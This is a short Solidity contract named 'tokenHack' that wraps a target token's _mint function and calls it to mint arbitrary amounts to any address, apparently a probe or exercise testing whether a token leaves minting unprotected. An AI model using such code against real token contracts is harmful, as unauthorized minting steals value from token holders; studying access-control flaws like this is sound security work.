//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Token {
	function _mint(address account, uint256 amount) external;
}

contract tokenHack {

	Token public tokenContract;

	constructor(address tokenAddress) {
		tokenContract = Token(tokenAddress);
	}

	function tryToMint(address _to, uint256 _amount) public {
		tokenContract._mint(_to, _amount);
	}

}